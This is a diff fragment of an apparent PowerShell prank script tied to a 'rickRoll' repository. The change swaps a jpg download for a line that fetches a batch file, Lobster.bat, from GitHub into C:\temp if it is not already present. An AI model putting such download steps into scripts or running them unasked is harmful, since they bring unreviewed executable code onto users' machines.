@@ -23,7 +23,7 @@ namespace Win32{
 }
 
 if (-not(Test-Path -Path $bat -PathType Leaf)) {
-   Invoke-WebRequest -Uri  -OutFile C:\temp\rickroll.jpg
+   Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/Lobster.bat -OutFile C:\temp\lobster.bat
 
 }
 if ((Test-Path -Path $filename -PathType Leaf)) {
